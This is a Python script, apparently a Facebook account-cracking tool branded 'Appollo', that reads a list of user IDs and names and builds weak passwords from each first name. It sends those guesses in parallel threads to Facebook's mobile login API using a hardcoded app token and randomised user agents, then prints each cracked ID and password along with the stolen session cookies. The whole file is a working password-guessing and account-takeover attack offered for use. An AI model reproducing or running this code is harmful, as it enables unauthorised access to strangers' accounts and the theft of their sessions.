#======= Sc SEND BY > KALYAN KING
id=[]

import requests
import random
import os,time,sys
import json
#import payfiglet
import user_agent
from time import sleep
from concurrent.futures import ThreadPoolExecutor

goll=f"""
\033[1;37m\033[1m
 _______  _______           _______  _______  _______ 
(  ____ \(  ____ )|\     /|(  ____ \(  ____ \(  ____ )
| (    \/| (    )|| )   ( || (    \/| (    \/| (    )|
| |      | (____)|| |   | || (_____ | (__    | (____)|
| |      |     __)| |   | |(_____  )|  __)   |     __)
| |      | (\ (   | |   | |      ) || (      | (\ (   
| (____/\| ) \ \__| (___) |/\____) || (____/\| ) \ \__
(_______/|/   \__/(_______)\_______)(_______/|/   \__/
\033[0;31m\033[1m{'='*40}\033[0;32m\033[1m
Developer - \033[1;33m\033[1mAppollo
\033[0;31m\033[1m{'='*40}"""
past=[]
past.append('last123')
past.append('first123')


def password():
   with ThreadPoolExecutor(max_workers=33)as KakoAppollo:
     for idss in id:
       pa=idss.strip()
       ap=idss.split('|')
       idf=idss.split('|')[0]
       pss=idss.split('|')[1]
       frs=pss.split(' ')
       pwv=[]
       pwv.append(frs[0]+'123')
       pwv.append(frs[0]+'112233')
       pwv.append(frs[0]+'12')
       pwv.append(frs[0]+'2000')
       pwv.append(frs[0]+'12345')
       pwv.append(frs[0]+'123123')
       pwv.append(frs[0]+'123321')
       pwv.append(frs[0]+'1234')
       pwv.append(frs[0]+'1999')
       pwv.append(frs[0]+'11223344')
       KakoAppollo.submit(crackfree,idf,pwv)
       
loop,ok=0,0
def crackfree(idf,pwv):
  try:
        global loop,ok
        sys.stdout.write(f'\r\r\r\r\r\033[1;37m\033[1m{str(len(id))}|{loop} \033[0;32m\033[1mOk:-{ok} '),sys.stdout.flush()
        for pw in pwv:
           head = {'user-agent':user_agent.generate_user_agent(),'Host':'graph.facebook.com','Content-Type':'application/json;charset=utf-8','Content-Length':'595','Connection':'Keep-Alive','Accept-Encoding':'gzip'}
           data ={"locale": "en_GB","format": "json","email": idf,"password": pw,"access_token":"438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28","generate_session_cookies": 1}
           res=requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data,allow_redirects=False).json()
           if 'session_key' in res:
              ok+=1
              kkk=';'.join(appollo['name']+'='+appollo['value'] for appollo in res['session_cookies'])
              print(f'\r\r\r\033[0;32m\033[1mAppollo-Ok {idf} | {pw} | {kkk}   ') 
              break                          
           elif 'www.facebook.com' in res['error']['message']:
              print(f'\r\r\r\033[1;33m\033[1mAppollo-Cp {idf} | {pw}  ')  
              break
           else:
               pass
        loop+=1
  except Exception as e:pass

def fileget():
    os.system('clear')
    os.system("xdg-open https://t.me/KGF_TEAM_CYBER")
    print(goll)
    try:
       file=input('\033[1;37m\033[1mName File !: ')
       for ege in open(file,'r').readlines():
          One=(ege.strip())
          id.append(One)  
       pass
    except Exception:
       print('\033[0;31m\033[1mError File Path System !! ');sleep(1)
       fileget()
    print('\033[1;37m\033[1m='*40)    
    password()    
fileget()                                                   